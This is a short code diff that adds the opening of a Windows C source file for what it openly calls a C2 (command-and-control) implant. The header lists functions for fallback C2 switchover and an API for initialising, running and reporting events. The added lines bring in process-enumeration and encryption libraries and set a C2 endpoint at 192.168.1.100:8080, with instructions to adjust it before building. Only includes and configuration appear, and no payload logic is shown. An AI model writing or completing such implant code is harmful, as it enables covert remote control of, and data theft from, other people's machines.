@@ -60,3 +60,29 @@
  *  12   Fallback C2 switchover
  *  13   Public API: c2_init, c2_run, c2_report_event, c2_shutdown
  */
+
+#define WIN32_LEAN_AND_MEAN
+#define _WIN32_WINNT  0x0601       /* Windows 7+ */
+#include <windows.h>
+#include <tlhelp32.h>
+#include <shlobj.h>
+#include <bcrypt.h>                /* AES, SHA-256 via CNG */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <stdarg.h>
+#include <ctype.h>
+#include <time.h>
+
+#pragma comment(lib, "bcrypt.lib")
+
+/* ═══════════════════════════════════════════════════════════════════════════
+ * SECTION 1 — Compile-time configuration
+ * Change these to match the actual C2 deployment before building.
+ * ═══════════════════════════════════════════════════════════════════════════ */
+
+/* Primary C2 endpoint */
+#define C2_HOST_PRIMARY       L"192.168.1.100"
+#define C2_PORT_PRIMARY       8080
+#define C2_USE_TLS_PRIMARY    0             /* 0=HTTP  1=HTTPS */
